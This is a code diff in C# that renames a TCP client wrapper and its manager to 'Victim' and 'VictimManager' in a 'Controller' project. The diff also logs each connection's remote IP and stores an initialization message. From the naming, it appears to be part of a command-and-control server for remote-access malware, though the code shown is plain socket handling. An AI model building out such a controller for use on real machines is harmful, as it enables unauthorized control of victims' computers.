@@ -1,12 +1,12 @@
-﻿using Controller.Models;
+﻿using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Text.Json;
 
-namespace Controller.Helpers
+namespace Controller.Models
 {
 
-    public interface IClient
+    public interface IVictim
     {
         Task SendMessageAsync<T>(string messageType, T payload);
         NetworkStream Stream { get; }
@@ -14,24 +14,36 @@ namespace Controller.Helpers
         string Id { get; }
     }
 
-    public class TCPClient : IClient
+    public class Victim : IVictim
     {
+        private bool initDone = false;
         private readonly TcpClient client;
         private readonly JsonSerializerOptions jsonOptions;
 
         public string Id { get; }
+        public string IP { get; }
+        public InitMSG? Prop { get; private set; }
 
         public NetworkStream Stream { get; }
 
-        public TCPClient(TcpClient client)
+        public Victim(TcpClient client)
         {
             this.client = client;
             Stream = client.GetStream();
             Id = Guid.NewGuid().ToString();
+            IP = ((IPEndPoint?)client.Client.RemoteEndPoint)?.Address?.ToString() ?? "Unknown";
+
             jsonOptions = new JsonSerializerOptions
             {
                 PropertyNameCaseInsensitive = true
             };
+        }
+
+        public void Init(InitMSG? imsg)
+        {
+            if (initDone) return;
+            initDone = true;
+            Prop = imsg;
         }
 
         public async Task SendMessageAsync<T>(string messageType, T payload)
@@ -62,12 +74,12 @@ namespace Controller.Helpers
         }
     }
 
-    public class ClientManager
+    public class VictimManager
     {
-        private readonly Dictionary<string, IClient> clients = [];
+        private readonly Dictionary<string, IVictim> clients = [];
         private readonly Lock clientLock = new();
 
-        public void AddClient(IClient client)
+        public void AddClient(IVictim client)
         {
             lock (clientLock)
             {
@@ -83,7 +95,7 @@ namespace Controller.Helpers
             }
         }
 
-        public IEnumerable<IClient> GetAllClients()
+        public IEnumerable<IVictim> GetAllClients()
         {
             lock (clientLock)
             {
